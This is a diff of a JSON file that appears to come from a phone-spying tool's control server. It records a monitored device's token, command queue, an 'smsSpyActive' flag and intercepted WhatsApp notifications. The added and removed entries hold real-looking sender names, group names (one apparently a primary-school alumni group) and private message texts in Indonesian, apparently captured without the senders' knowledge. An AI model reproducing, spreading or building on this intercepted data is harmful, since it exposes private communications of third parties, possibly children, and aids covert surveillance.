@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776922082413,
+    "lastSeen": 1776922088719,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎68 pesan dari 41 chat",
+        "time": "23/04 13:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922083190
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 13:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922083143
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 09:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776908702756
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎61 pesan dari 39 chat",
-        "time": "23/04 09:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908699414
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Nakan",
-        "content": "📷 Foto",
-        "time": "23/04 09:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908699351
       }
     ],
     "galleryPhotos": [],
@@ -9971,6 +9971,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎ALUMNI SDN RAPPOCINI KELAS ANGKATAN 2023-2024🫂💗 (107 pesan): ~ მႮჁმ",
+        "content": "mau ka pergi latihan",
+        "time": "23/04 13:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922091375
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎Senam Rappocini (9 pesan): ~ Nursiah",
         "content": "😄",
         "time": "23/04 13:12",
@@ -13960,14 +13968,6 @@
         "time": "22/04 17:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776849064471
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Senam Rappocini (2 pesan): ~ Ikha😎",
-        "content": "Itu mi ku bilang diluar parkiran luas baru bnyak kendaraan",
-        "time": "22/04 17:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776849064442
       }
     ],
     "galleryPhotos": [],
